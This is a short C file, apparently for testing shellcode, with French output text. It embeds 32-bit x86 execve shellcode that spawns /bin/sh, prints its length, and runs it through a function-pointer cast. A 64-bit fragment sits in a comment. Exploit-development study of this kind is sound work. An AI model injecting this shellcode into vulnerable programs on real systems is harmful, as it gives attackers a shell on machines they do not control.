#include <stdio.h>
#include <string.h>
#include <unistd.h>

//  \x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54
unsigned char code[] =
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(int argc,  char *argv[]){

    printf("Longueur shellcode : %d octets\n", (int)strlen(code));

//    unsigned char code = argv[1];
//    unsigned char code[] = testvar;

    int (*ret)() = (int(*)())code;

    ret();
//
////    const char *argvx = ["/bin/sh", "lol"];
//
//    execve("/bin/sh", NULL, NULL);


}